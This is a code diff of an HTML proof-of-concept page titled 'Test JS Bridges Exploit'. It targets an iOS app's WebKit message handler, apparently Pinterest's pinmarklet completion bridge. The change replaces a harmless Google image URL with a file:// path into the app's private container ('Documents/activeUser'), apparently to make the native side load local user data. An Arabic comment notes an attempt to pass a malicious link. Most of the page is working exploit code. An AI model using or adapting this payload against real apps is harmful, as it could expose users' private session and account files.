@@ -1,4 +1,4 @@
-<!-- <!DOCTYPE html>
+<!DOCTYPE html>
 <html>
 <head>
   <title>Test JS Bridges Exploit</title>
@@ -86,36 +86,51 @@
       }
     }
 
-    function sendPinmarkletCompletion() {
-      try {
-        // محاولة تمرير رابط خبيث (ممكن يستغل تحميل صور ضارة مثلا)
+//     function sendPinmarkletCompletion() {
+//       try {
+//         // محاولة تمرير رابط خبيث (ممكن يستغل تحميل صور ضارة مثلا)
      
-        const data = {
+//         const data = {
+//         board_id: "813392451390315106",
+//         color: "#bf8f97",
+//         description: "Test JS Bridges Exploit",
+//         method: "in_app_browser",
+//         found_metadata:"%7B%7D",
+//         source_url: "https://www.google.com/search?sca_esv=f3a7ee0e23e81309&sxsrf=AE3TifMBUAbQwHTJOawbdGFE_NQGNvZJzQ:1754105139725&udm=2&fbs=AIIjpHxU7SXXniUZfeShr2fp4giZ1Y6MJ25_tmWITc7uy4KIeoJTKjrFjVxydQWqI2NcOhYPURIv2wPgv_w_sE_0Sc6QqqU7k8cSQndc5mTXCIWHa_uc-TjDJYRtLl-RKXlVOTL5mI-WiiglTJRFGvAEXXnfu4L_6T9ekFD4xUIb2JpUEZ-6G9sITRMPa4w9LVpn242Omi9aqnee4isVwsbqisykLExtmQ&q=images&sa=X&ved=2ahUKEwj-7YHuluuOAxUISEEAHY_OCRUQtKgLegQIExAB&biw=1728&bih=891&dpr=2#vhid=kt9a95Fkz4GXzM&vssid=mosaic"
+// };
+
+// window.webkit.messageHandlers.pinmarkletCompletionHandler.postMessage(data);
+
+
+//       } catch (e) {
+//         alert("❌ Error: " + e.message);
+//       }
+//     }
+
+      function sendPinmarkletCompletion() {
+    try {
+      const data = {
         board_id: "813392451390315106",
         color: "#bf8f97",
-        description: "Test JS Bridges Exploit",
+        description: "Test exploit Bridges",
         method: "in_app_browser",
-        found_metadata:"%7B%7D",
-        source_url: "https://www.google.com/search?sca_esv=f3a7ee0e23e81309&sxsrf=AE3TifMBUAbQwHTJOawbdGFE_NQGNvZJzQ:1754105139725&udm=2&fbs=AIIjpHxU7SXXniUZfeShr2fp4giZ1Y6MJ25_tmWITc7uy4KIeoJTKjrFjVxydQWqI2NcOhYPURIv2wPgv_w_sE_0Sc6QqqU7k8cSQndc5mTXCIWHa_uc-TjDJYRtLl-RKXlVOTL5mI-WiiglTJRFGvAEXXnfu4L_6T9ekFD4xUIb2JpUEZ-6G9sITRMPa4w9LVpn242Omi9aqnee4isVwsbqisykLExtmQ&q=images&sa=X&ved=2ahUKEwj-7YHuluuOAxUISEEAHY_OCRUQtKgLegQIExAB&biw=1728&bih=891&dpr=2#vhid=kt9a95Fkz4GXzM&vssid=mosaic"
-};
+        found_metadata: "%7B%7D",
+        source_url: "file:///private/var/mobile/Containers/Data/Application/DE1F2730-70D5-4898-AA09-B584FBCDEC23/Documents/activeUser"
+      };
 
-window.webkit.messageHandlers.pinmarkletCompletionHandler.postMessage(data);
-
-
-      } catch (e) {
-        alert("❌ Error: " + e.message);
-      }
+      window.webkit.messageHandlers.pinmarkletCompletionHandler.postMessage(data);
+    } catch (e) {
+      alert("❌ Error: " + e.message);
     }
-
-    
+  }
 
   </script>
 
 </body>
-</html> -->
+</html>
 
 
-
+<!-- 
 <!DOCTYPE html>
 <html>
   <head>
@@ -146,4 +161,4 @@ window.webkit.messageHandlers.pinmarkletCompletionHandler.postMessage(data);
       }
     </script> -->
   </body>
-</html>
+</html> -->
